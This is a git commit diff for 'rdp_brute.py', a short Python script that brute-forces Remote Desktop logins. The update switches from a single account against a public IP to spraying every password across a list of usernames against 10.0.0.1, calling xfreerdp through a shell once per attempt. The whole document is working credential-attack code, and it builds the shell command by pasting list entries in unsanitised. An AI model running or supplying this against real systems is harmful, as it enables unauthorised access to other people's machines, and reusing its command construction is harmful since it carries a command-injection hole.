b5c3d69b8038b7711d5cf672339eeb1a3ad0f08b
Daniel Bates <danielrbates@gmail.com>
2021-06-04 21:37:46 -0400

    Update rdp_brute.py

--- rdp_brute.py
+++ rdp_brute.py
@@ -1,14 +1,17 @@
 import subprocess, time
 
-ip = "34.252.140.102"
-user = "CAadmin"
+ip = "10.0.0.1"
 
-# Read password-list
-with open('passwordlist.txt') as f:
-	for line in f:
-		password = line.strip()
-		print('Attempting to log in with username: ' + user + ', password: ' + password)
-		cmd = 'xfreerdp /cert-ignore /u:' + user + ' /p:"' + password + '" /v:' + ip + ':3389'
-		#print(cmd)
-		x = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-		time.sleep(5)
+# Import usernames and passwords
+with open('userlist.txt') as userlist, open('passwordlist.txt') as passwordlist:
+    users = [line.rstrip() for line in userlist]
+    passwords = [line.rstrip() for line in passwordlist]
+
+# Iterate through all usernames for each password:
+for password in passwords:
+        for user in users:
+                print('Attempting password "' + password + '" with username "' + user + '"')
+                cmd = 'xfreerdp /cert-ignore /u:' + user + ' /p:"' + password + '" /v:' + ip + ':3389'
+                #print(cmd)
+                attempt = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+                time.sleep(1)
